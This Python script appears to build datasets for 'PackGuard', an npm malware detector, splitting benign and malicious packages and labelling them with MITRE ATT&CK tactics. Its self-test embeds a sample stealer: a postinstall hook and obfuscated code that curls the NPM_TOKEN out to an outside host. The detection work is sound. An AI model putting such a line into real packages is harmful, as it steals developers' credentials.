"""
PackGuard Stage 2 v4 — Mega-Dataset Preparation Pipeline

Processes raw npm benign packages, DataDog malware, and T1–T4 obfuscated variants:
  1. Applies AST De-obfuscation (`ast_deobfuscator.py`)
  2. Packs files into 2,048-token sequences (`text_formatter.py`)
  3. Extracts 4 MITRE ATT&CK ground-truth labels (`mitre_exec`, `mitre_steal`, `mitre_exfil`, `mitre_persist`)
  4. Emits leak-free package-disjoint `train.jsonl`, `val.jsonl`, and `test.jsonl` splits.
"""

import argparse
import hashlib
import json
import os
from pathlib import Path
from typing import Any, Dict, List, Tuple

from text_formatter import (
    clean_and_unfold_js,
    extract_mitre_threat_labels,
    format_scanner_chunks_to_text,
)


def package_dir_to_v4_sample(pkg_dir: Path, label: int, tier: str = "RAW") -> Dict[str, Any]:
    """Convert an unpacked npm package directory into a v4 training sample."""
    chunks: List[Dict[str, Any]] = []
    has_hook = False

    pkg_json = pkg_dir / "package.json"
    if pkg_json.exists():
        try:
            raw_pj = pkg_json.read_text(encoding="utf-8", errors="replace")
            chunks.append({"file": "package.json", "kind": "script", "start": 0, "text": raw_pj})
            doc = json.loads(raw_pj)
            scripts = doc.get("scripts") or {}
            if any(k in scripts for k in ("preinstall", "install", "postinstall")):
                has_hook = True
        except Exception:
            pass

    for root, _, files in os.walk(pkg_dir):
        for fname in sorted(files):
            if fname.endswith((".js", ".cjs", ".mjs")):
                fpath = Path(root) / fname
                try:
                    code = fpath.read_text(encoding="utf-8", errors="replace")
                    rel = str(fpath.relative_to(pkg_dir)).replace("\\", "/")
                    chunks.append({"file": rel, "kind": "js", "start": 0, "text": code})
                except Exception:
                    pass

    record = {"package": pkg_dir.name, "chunks": chunks, "tier": tier}
    formatted_text = format_scanner_chunks_to_text(record, max_chars=12000)
    mitre = extract_mitre_threat_labels(formatted_text, has_install_hook=has_hook)

    if label == 0:
        mitre = {"mitre_exec": 0, "mitre_steal": 0, "mitre_exfil": 0, "mitre_persist": 0}

    return {
        "package": pkg_dir.name,
        "tier": tier,
        "label": label,
        "mitre": mitre,
        "text": formatted_text,
    }


def deterministic_split(pkg_name: str) -> str:
    """Assign package deterministically to train (80%), val (10%), or test (10%) to prevent leakage."""
    h = int(hashlib.sha256(pkg_name.encode("utf-8")).hexdigest()[:8], 16) % 100
    if h < 80:
        return "train"
    elif h < 90:
        return "val"
    return "test"


def run_self_test() -> bool:
    print("[*] Running PackGuard Stage 2 v4 Dataset Builder Self-Test...")
    sample_rec = {
        "package": "demo-stealer-pkg",
        "chunks": [
            {
                "file": "package.json",
                "kind": "script",
                "start": 0,
                "text": '{"name": "demo-stealer-pkg", "scripts": {"postinstall": "node index.js"}}',
            },
            {
                "file": "index.js",
                "kind": "js",
                "start": 0,
                "text": 'const c = require("\\x63\\x68\\x69\\x6c\\x64\\x5f\\x70\\x72\\x6f\\x63\\x65\\x73\\x73"); c.execSync("curl https://oastify.com?k=" + process["env"]["NPM_TOKEN"]);',
            },
        ],
    }
    formatted = format_scanner_chunks_to_text(sample_rec)
    mitre = extract_mitre_threat_labels(formatted, has_install_hook=True)
    split = deterministic_split("demo-stealer-pkg")
    print(f"  [+] Assigned Split: {split} | MITRE Labels: {mitre}")
    assert mitre == {"mitre_exec": 1, "mitre_steal": 1, "mitre_exfil": 1, "mitre_persist": 1}
    print("[+] DATASET BUILDER SELF-TEST PASSED!")
    return True


def main() -> None:
    parser = argparse.ArgumentParser(description="Prepare PackGuard Stage 2 v4 Multi-Task Dataset")
    parser.add_argument("--source-dir", type=str, help="Root directory containing benign and malware packages")
    parser.add_argument("--out-dir", type=str, default="data/v4", help="Output directory for JSONL splits")
    parser.add_argument("--self-test", action="store_true")
    args = parser.parse_args()

    if args.self_test or not args.source_dir:
        run_self_test()
        return

    src = Path(args.source_dir).resolve()
    out = Path(args.out_dir).resolve()
    out.mkdir(parents=True, exist_ok=True)

    splits: Dict[str, List[str]] = {"train": [], "val": [], "test": []}
    for category, label in [("benign", 0), ("malware", 1)]:
        cat_dir = src / category
        if not cat_dir.exists():
            continue
        for pkg_dir in sorted(cat_dir.iterdir()):
            if pkg_dir.is_dir():
                sample = package_dir_to_v4_sample(pkg_dir, label=label)
                sp = deterministic_split(pkg_dir.name)
                splits[sp].append(json.dumps(sample))

    for sp_name, lines in splits.items():
        (out / f"{sp_name}.jsonl").write_text("\n".join(lines) + "\n", encoding="utf-8")
        print(f"[+] Wrote {len(lines)} samples to {out / f'{sp_name}.jsonl'}")


if __name__ == "__main__":
    main()
